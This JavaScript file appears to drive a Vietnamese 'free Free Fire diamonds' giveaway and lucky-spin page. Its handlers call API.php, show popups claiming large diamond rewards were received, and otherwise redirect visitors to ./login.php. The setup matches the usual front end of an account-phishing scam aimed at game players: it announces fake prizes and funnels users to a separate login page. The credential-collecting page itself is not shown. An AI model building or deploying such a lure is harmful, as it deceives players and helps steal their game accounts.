 function getParameterByName(name, url = window.location.href) {
    name = name.replace(/[\[\]]/g, '\\$&');
    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, ' '));
}
 function nhanqua(idqua){
           
            $.get("API.php",
  function(data, status){
      if(data == '1' || data == '2' || data == '3' || data == '4' || data == '5' || data == '6'  || data == '7'  || data == '8'){
    $("#qua"+idqua).attr('disabled','disabled');
    $("#qua"+idqua).text('Đã Nhận');
    Swal.fire({
  title: 'Nhận Quà Thành Công!',
  text:'Vui lòng kiểm tra Tài Khoản Free Fire !'
})
}
 else {
     Swal.fire({
  title: 'Bạn chưa đăng nhập',
  text: "Vui lòng đăng nhập để nhận quà !",
  icon: 'error',
  showCancelButton: false,
  confirmButtonColor: '#3085d6',
  cancelButtonColor: '#d33',
  confirmButtonText: 'Đăng Nhập Ngay!'
}).then((result) => {
  formdangnhap();
})
 }
  });
        
          
      }
      $("#quayso_vohuunhan").click(function(){
            $(".kimcuongz #quayso_vohuunhan b").text('Đang quay...');
            $(".khong").removeClass('datrung');
            $(".vhncardquayso").show();
            $(".khong").hide();
            quayso();
            function quayso(){ 
            $.get("API.php",
  function(data, status){
      if(data == '1' || data == '2' || data == '3' || data == '4' || data == '5' || data == '6'  || data == '7'  || data == '8'){
    $(".kimcuongz #quayso_vohuunhan b").text('Quay số');
    $(".vhncardquayso").hide();
    $(".khong").show();
    $(".phanqua"+data).addClass('datrung');
    $(".khong").attr('style','opacity: 0.5');
    if(data == '1'){ var kc = '9.999' }
    if(data == '2'){ var kc = '45' }
    if(data == '3'){ var kc = '200' }
    if(data == '4'){ var kc = '2.375' }
    if(data == '5'){ var kc = '950' }
    if(data == '6'){ var kc = '90' }
    if(data == '7'){ var kc = '135' }
    if(data == '8'){ var kc = '9.999' }
    Swal.fire({
  title: 'Đã nhận thành công '+kc+' Kim Cương'
})
}
 else {
     Swal.fire({
  title: 'Bạn chưa đăng nhập',
  text: "Vui lòng đăng nhập để bắt đầu quay nào",
  icon: 'error',
  showCancelButton: false,
  confirmButtonColor: '#3085d6',
  cancelButtonColor: '#d33',
  confirmButtonText: 'Đăng Nhập Ngay!'
}).then((result) => {
  formdangnhap();
})
 }
  });
            }
          
      })
      function formdangnhap(){
          window.location.href="./login.php";
      }